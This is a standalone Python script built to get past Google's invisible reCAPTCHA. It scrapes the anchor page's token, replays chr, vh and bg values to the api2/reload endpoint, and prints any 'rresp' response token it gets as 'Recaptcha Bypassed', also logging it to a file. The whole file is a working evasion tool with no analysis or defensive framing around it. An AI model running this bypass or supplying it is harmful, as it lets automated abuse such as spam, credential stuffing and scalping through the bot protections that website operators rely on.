import requests
import json
import urllib
import time

anchorr = str(input("Anchor URL : "))
anchorr = anchorr.strip()
keysite = anchorr.split('k=')[1].split("&")[0]
var_co = anchorr.split("co=")[1].split("&")[0]
var_v = anchorr.split("v=")[1].split("&")[0]

r1 = requests.get(anchorr).text

token1 = r1.split('recaptcha-token" value="')[1].split('">')[0]

var_chr = str(input("CHR ([xx, xx, xx]) : "))
var_vh = str(input("VH : "))
var_bg = str(input("BG : "))
var_chr = str(urllib.parse.quote(var_chr))
print("\n\nBypassing Recaptcha...")

payload = {
    "v":var_v,
    "reason":"q",
    "c":token1,
    "k":keysite,
    "co":var_co,
    "hl":"en",
    "size":"invisible",
    "chr":var_chr,
    "vh":var_vh,
    "bg":var_bg
}

r2 = requests.post("https://www.google.com/recaptcha/api2/reload?k={}".format(keysite), data=payload)
try:
    token2 = str(r2.text.split('"rresp","')[1].split('"')[0])
except:
    token2 = 'null'

if token2 == "null":
    print("\nRecaptcha not vulnerable : \n\n"+str(r2.text))
else:
    print("\nRecaptcha Bypassed : \n\n"+str(token2))
    with open("bypassed.txt", "a") as file:
        file.write("RECAPTCHA BYPASSED\n\n\n\nAnchor : "+str(anchorr)+"\n\n\nReload : https://www.google.com/recaptcha/api2/reload?k="+str(keysite)+f"\n\nPayload : v={var_v}&reason=q&c=<token>&k={keysite}&co={var_co}&hl=en&size=invisible&chr={var_chr}&vh={var_vh}&bg={var_bg}")
#v=()&reason=q&c=<token>&k=()&co=()&hl=en&size=invisible&chr=()&vh=()&bg=()
